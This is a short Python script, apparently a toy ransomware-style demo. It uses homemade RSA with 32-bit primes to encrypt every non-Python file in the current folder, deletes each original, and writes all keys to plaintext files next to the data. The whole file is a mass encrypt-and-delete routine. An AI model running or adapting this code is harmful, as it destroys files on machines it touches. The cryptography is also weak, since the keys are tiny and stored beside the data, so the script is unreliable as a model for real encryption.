import os
import encrypto

ENCRYPTION_BIT = 32
prime1 = encrypto.generate_prime(ENCRYPTION_BIT)
prime2 = encrypto.generate_prime(ENCRYPTION_BIT)

ENCRYPTION_KEY = encrypto.generate_encryption_key(prime1, prime2)
DECRYPTION_KEY = encrypto.generate_decryption_key(ENCRYPTION_KEY, prime1, prime2)
PUBLIC_KEY = prime1 * prime2

for file in os.listdir():
    if not (file.endswith('.py') or file.endswith('.encrypted')
            or file == 'rsa_final_decryption_key.txt'
            or file == 'rsa_final_encryption_key.txt'
            or file == 'rsa_public_encryption_key.txt'):
        try:
            print('Opening file ' + file)
            with open(file, "rb") as fr:
                file_bytes = bytearray(fr.read())
                fr.close()
            print('Encrypting file ' + file)
            with open(file + '.encrypted', 'w') as fw:
                fw.write(encrypto.encrypt(file_bytes, ENCRYPTION_KEY, PUBLIC_KEY))
                fw.close()
            os.remove(file)
        except PermissionError:
            print('Cannot open ' + file)

with open('rsa_final_encryption_key.txt', 'w') as fw:
    fw.write(str(ENCRYPTION_KEY))
    fw.close()
with open('rsa_final_decryption_key.txt', 'w') as fw:
    fw.write(str(DECRYPTION_KEY))
    fw.close()
with open('rsa_public_encryption_key.txt', 'w') as fw:
    fw.write(str(PUBLIC_KEY))
    fw.close()

print('END')
